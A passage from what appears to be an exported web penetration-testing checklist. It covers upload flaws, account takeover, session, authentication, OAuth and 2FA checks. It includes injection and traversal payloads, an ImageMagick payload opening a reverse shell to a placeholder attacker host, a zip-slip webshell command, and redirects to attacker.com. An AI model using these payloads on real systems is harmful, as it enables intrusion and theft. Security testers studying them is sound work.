+GIF: GIF87a OR GIF8;</code></pre></div></details></div></details><details id="134b0a6a-b787-8104-8a5d-e334af6aa550" open="" class="toggle" dir="auto"><summary>Filename vulnerabilities</summary><div class="indented"><ul id="134b0a6a-b787-8101-9b18-f6cb7838a24f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Time-Based SQLi Payloads: e.g. <code>poc.js&#x27;(select*from(select(sleep(20)))a)+&#x27;.extension</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81db-992f-cdb7c4b01b49" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LFI/Path Traversal Payloads: e.g. <code>image.png../../../../../../../etc/passwd</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8187-b1f6-fc725eb9970e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XSS Payloads e.g. <code>&#x27;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;.extension</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8175-b455-d1a276b4b9cc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">File Traversal e.g. <code>../../../tmp/lol.png</code></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8102-a3e4-c3be0a085d63" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Command Injection e.g. <code>; sleep 10;</code></span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-810d-acda-fce8ad6d14bc" open="" class="toggle" dir="auto"><summary>Picture Compression</summary><div class="indented"></div></details><details id="134b0a6a-b787-81a2-8659-e3b195960e1b" open="" class="toggle" dir="auto"><summary>Configuration Files</summary><div class="indented"><pre id="134b0a6a-b787-81ba-a4dc-e046106d9c2f" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">PHP server, take a look at the .htaccess trick to execute code.
+ASP server, take a look at the web.config trick to execute code.
+uWSGI server, take a look at the uwsgi.ini trick to execute code.</code></pre></div></details><details id="134b0a6a-b787-814b-8ba6-d702c0c0c551" open="" class="toggle" dir="auto"><summary>CVE - ImageMagick</summary><div class="indented"><p id="134b0a6a-b787-8135-9409-f6065a6e2e08" class="" dir="auto">If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.</p><pre id="134b0a6a-b787-817a-a079-c8d44d72695d" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">push graphic-context
+viewbox 0 0 640 480
+fill &#x27;url(https://127.0.0.1/test.jpg&quot;|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch &quot;hello)&#x27;
+pop graphic-context</code></pre></div></details><details id="134b0a6a-b787-8118-bced-fb11da44c243" open="" class="toggle" dir="auto"><summary>ZIP archive</summary><div class="indented"><p id="134b0a6a-b787-813d-b767-d7a618d6376f" class="" dir="auto">When a ZIP/archive file is automatically decompressed after the upload</p><pre id="134b0a6a-b787-8190-a52e-fb33e77d6b67" class="code code-wrap" data-notion-code-syntax="jsx"><code class="language-jsx" style="white-space:pre-wrap;word-break:break-all">python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
+
+ln -s ../../../index.php symindex.txt
+zip --symlinks test.zip symindex.txt</code></pre></div></details><details id="134b0a6a-b787-8197-ba6c-d690a4a3c32e" open="" class="toggle" dir="auto"><summary>Extensions Impact</summary><div class="indented"><pre id="134b0a6a-b787-814c-9893-fcc80051a0b1" class="code code-wrap" data-notion-code-syntax="html"><code class="language-html" style="white-space:pre-wrap;word-break:break-all">ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
+SVG: Stored XSS / SSRF / XXE
+GIF: Stored XSS / SSRF
+CSV: CSV injection
+XML: XXE
+AVI: LFI / SSRF
+HTML / JS : HTML injection / XSS / Open redirect
+PNG / JPEG: Pixel flood attack (DoS)
+ZIP: RCE via LFI / DoS
+PDF / PPTX: SSRF / BLIND XXE</code></pre></div></details></div></details><details id="134b0a6a-b787-8056-9dce-f134c911a5ab" open="" class="toggle" dir="auto"><summary><strong>Insecure deserialization</strong></summary><div class="indented"><ul id="134b0a6a-b787-8135-870a-ce0e96453824" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Manipulating serialized objects</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81eb-9df1-dfaeb55f47c8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Injecting arbitrary objects</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8130-9050-f4ca258933ed" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">PHAR deserialization</span><div class="indented"></div></li></ul><p id="134b0a6a-b787-81ec-9073-c21251ecd1cc" class="" dir="auto">Resource: <a href="https://vickieli.dev/insecure%20deserialization">https://vickieli.dev/insecure deserialization</a></p></div></details><details id="134b0a6a-b787-8006-9b0c-d1d2d87415fb" open="" class="toggle" dir="auto"><summary><strong>Account Takeover - Chaining Bugs</strong></summary><div class="indented"><ul id="134b0a6a-b787-813f-911a-ccfedd0d56e4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">IDOR on email change to Account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816f-9baf-fded2a153400" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Host Header Injection on email change</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81fc-99f3-ce45799eb7a5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Open Redirection to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8130-b2bc-c32258ce2dc1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">HTML Injection to AWS Metadata Leak Leading to AWS takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8198-ab76-c1e4580d585c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Password Reset Poisoning to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ee-b32f-db55d77369e8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Mass Assignment leading to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e3-b8bf-c910a8ed67d2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Lack of Server-Side validation in Email during Registration leading to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8115-abd4-c604f1d12ee9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Insecure Deeplink allowing account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-818d-a06c-eb4b4c0730c1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">GraphQL Introspection to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819b-b271-efeee85c2f21" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CRLF to XSS leading to account takeover</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8167-84f4-d47b3d4cd821" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">IDOR on API Parameters</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-813d-8e15-d8ad9e7a2e1d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Account Takeover via CSRF</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8055-9550-fb4d9145b54b" open="" class="toggle" dir="auto"><summary><strong>Registration Feature Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81a7-a240-efd1d21e8959" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for duplicate registration/Overwrite existing user</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8139-a479-c2a0c940afb8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for weak password policy</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810d-8fb3-d151d29bba40" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for reuse existing usernames</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8198-a44d-e0d998953f09" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for insufficient email verification process</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8178-b8de-df6413c70307" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak registration implementation-Allows disposable email addresses</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8111-a3b3-c6aa531f1753" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak registration implementation-Over HTTP</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-802e-b3c1-e8eff3a49c3b" open="" class="toggle" dir="auto"><summary><strong>Session Management Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81d4-b4a0-d1d21d774052" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Identify actual session cookie out of bulk cookies in the application</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8115-a23e-fb822e7ae28b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Decode cookies using some standard decoding algorithms such as Base64, hex, URL, etc</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819d-9677-ffa8a3bb0467" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Modify cookie.session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f1-8a6b-d5a1f3831698" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on. If another user-specific data is submitted at login or stored in user profiles (such as an email address)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8194-8ed2-e8598799637f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for session cookies and cookie expiration date/time</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8142-8729-cc083755be1c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Identify cookie domain scope</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8196-933d-fdd9ef85dd35" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for HttpOnly flag in cookie</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c3-8cff-f9f21caef9f1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for Secure flag in cookie if the application is over SSL</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8119-87f5-e8c7466e6407" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for session fixation i.e. value of session cookie before and after authentication</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8115-bb36-d8cca16ba2e3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Replay the session cookie from a different effective IP address or system to check whether the server maintains the state of the machine or not</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81fd-8f82-c6c5e70986be" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check for concurrent login through different machine/IP</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ad-a81a-cd39e91584ef" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if any user pertaining information is stored in cookie value or not If yes, tamper it with other user&#x27;s data</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8198-b1fe-fc9c2aa5515a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Failure to Invalidate Session on (Email Change,2FA Activation)</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-809c-ae4d-f7ae3d91d680" open="" class="toggle" dir="auto"><summary><strong>Authentication Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-8111-a504-d3465c2e01b9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Username enumeration</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8176-814c-f3f646d31c65" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass authentication using various SQL Injections on username and password field</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-8198-a0bc-cd2784c0c8be" open="" class="toggle" dir="auto"><summary>Lack of password confirmation on</summary><div class="indented"><ul id="134b0a6a-b787-8130-bdc3-d3de98a4a3fc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Change email address</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a9-93ed-e893a5ac8619" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Change password</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8137-979b-c315791ad278" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Manage 2FA</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-81c7-879e-ff0503bf7ab9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is it possible to use resources without authentication? Access violation</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f0-a627-c2fe0b905db6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if user credentials are transmitted over SSL or not</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8129-b148-cf5aa389f07e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak login function HTTP and HTTPS both are available</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-81ca-9d2c-ca695f648747" open="" class="toggle" dir="auto"><summary>Test user account lockout mechanism on brute force attack</summary><div class="indented"><p id="134b0a6a-b787-81c0-b5ab-dd9063bec9c1" class="" dir="auto">Variation : If server blocks instant user requests, then try with time throttle option from intruder and repeat the process again.</p><ul id="134b0a6a-b787-8159-8509-d1a3c1693a36" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass rate limiting by tampering user agent to Mobile User agent</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8198-bb62-e48d98df0a22" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass rate limiting by tampering user agent to Anonymous user agent</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8132-b4ca-d097a636a4e4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bypass rate liniting by using null byte</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-8140-b4f6-e0882addee3a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Create a password wordlist using cewl command</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-81b3-93fc-e2b6b1863cb6" open="" class="toggle" dir="auto"><summary>Test Oauth login functionality</summary><div class="indented"><details id="134b0a6a-b787-812d-a9d9-c3ffd322abba" open="" class="toggle" dir="auto"><summary>OAuth Roles</summary><div class="indented"><ul id="134b0a6a-b787-81ae-86d1-caf9a3367d0c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Resource Owner → User</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f2-87ba-df833a46e286" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Resource Server → Twitter</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8157-9b46-f9b0192680d2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Client Application → <a href="http://twitterdeck.com/">Twitterdeck.com</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-815a-b798-c2ea6606ba16" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Authorization Server → Twitter</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e8-97dd-c0654854b0e4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">client_id → Twitterdeck ID (This is a public, non-secret unique identifier_</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a6-91d7-c9ebb90608f9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">client_secret → Secret Token known to the Twitter and Twitterdeck to generate access_tokens</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e3-80b1-e901e7674466" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">response_type → Defines the token type e.g (code, token, etc.)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817e-b59e-c08f5287969e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">scope → The requested level of access Twitterdeck wants</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8159-9334-d26f5bd88955" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">redirect_uri → The URL user is redirected to after the authorization is complete</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f0-affa-d51e14c6cc21" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">state → Main CSRF protection in OAuth can persist data between the user being directed to the authorization server and back again</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a6-8278-e9be4409d856" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">grant_type → Defines the grant_type and the returned token type</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-813f-b2c0-d09044c4f59c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">code → The authorization code twitter generated, will be like ?code= , the code is used with client_id and client_secret to fetch an access_token</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8172-b486-ec9d0eef8c97" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">access_token → The token twitterdeck uses to make API requests on behalf of the user</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812b-b764-ea1e098cbce2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">refresh_token → Allows an application to obtain a new access_token without prompting the user</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-814e-b6e6-f8e13d0acc6e" open="" class="toggle" dir="auto"><summary>Code Flaws</summary><div class="indented"><ul id="134b0a6a-b787-812e-865c-fa14301affa0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Re-Using the code</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8103-b007-c7e2dbb6c045" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Code Predict/Bruteforce and Rate-limit</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a0-8f5a-ebe21fe75e56" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is the code for application X valid for application Y?</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81fb-93aa-ee2e80b53465" open="" class="toggle" dir="auto"><summary>Redirect_uri Flaws</summary><div class="indented"><ul id="134b0a6a-b787-8151-9823-d6f9862099e9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">URL isn&#x27;t validated at all: ?redirect_uri=https://attacker.com</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8114-be0f-d56fa9a7f8fb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): ?redirect_uri=https://sub.twitterdeck.com</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8184-b428-e956db7c4a9d" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Host is validated, path isn&#x27;t Chain open redirect): ?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8159-84c4-faae360c9ae5" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Host is validated, path isn&#x27;t (Referer leakages): Include external content on HTML page and leak code via Referer</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8182-9666-d39678f162f4" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak Regexes</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c4-b245-deae726e26e0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bruteforcing the URL encoded chars after host: redirect_uri=https://twitterdeck.com§FUZZ§</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81a5-81fe-c67bc00c181c" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Bruteforcing the keywords whitelist after host (or on any whitelist open redirect filter): ?redirect_uri=https://§FUZZ§.com</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8148-aafb-e991b69e8148" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">URI validation in place: use typical open redirect payloads</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-815a-9d38-c71356e754fc" open="" class="toggle" dir="auto"><summary>State Flaws</summary><div class="indented"><ul id="134b0a6a-b787-8121-8762-dcaabe1dfdbe" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Missing State parameter? (CSRF)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8103-a09f-d6a6139ef983" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Predictable State parameter?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c9-8124-da1623b4be78" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is State parameter being verified?</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-813f-be6a-e1a3b746d1ad" open="" class="toggle" dir="auto"><summary>Misc</summary><div class="indented"><ul id="134b0a6a-b787-81eb-93e9-d36373ef0712" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Is client_secret validated?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f4-881d-e41ebc497a56" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Pre ATO using facebook phone-number signup</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-818e-8474-cc5945edd6fb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">No email validation Pre ATO</span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-81db-9e52-e4ed4ad58f42" open="" class="toggle" dir="auto"><summary>Test 2FA Misconfiguration</summary><div class="indented"><ul id="134b0a6a-b787-815b-b42a-d89bc59b3e32" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Response Manipulation</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81da-86fe-e76ae0a292d7" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Status Code</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8180-a295-fe8f10d01970" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Manipulation</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8156-99ed-db4bf2015b49" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">2FA Code Leakage in Response</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e6-8fa7-f3d7fe18c217" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">2FA Code Reusability</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-817b-a150-cccd453f2d73" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Lack of Brute-Force Protection</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816a-8a08-cc83ca64e6d8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Missing 2FA Code Integrity Validation</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b8-bf60-c0695958e6c3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">With null or 000000</span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-80c1-be42-fc732432aa64" open="" class="toggle" dir="auto"><summary><strong>My Account (Post Login) Testing</strong></summary><div class="indented"><ul id="134b0a6a-b787-81b7-85e2-e13020c69808" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Find parameter which uses active account user id. Try to tamper it in order to change the details of the other accounts</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8182-9aec-f722d0842db2" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Create a list of features that are pertaining to a user account only. Change Email Change Password -Change account details (Name, Number, Address, etc.) Try CSRF</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8171-b3d7-e0cda2ab0805" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Post login change email id and update with any existing email id. Check if its getting validated on server side or not. Does the application send any new email confirmation link to a new user or not? What if a user does not confirm the link in some time frame?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8125-a0cd-c68a8a1b9f22" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Open profile picture in a new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8175-8a59-ca9bb78f5a5f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox 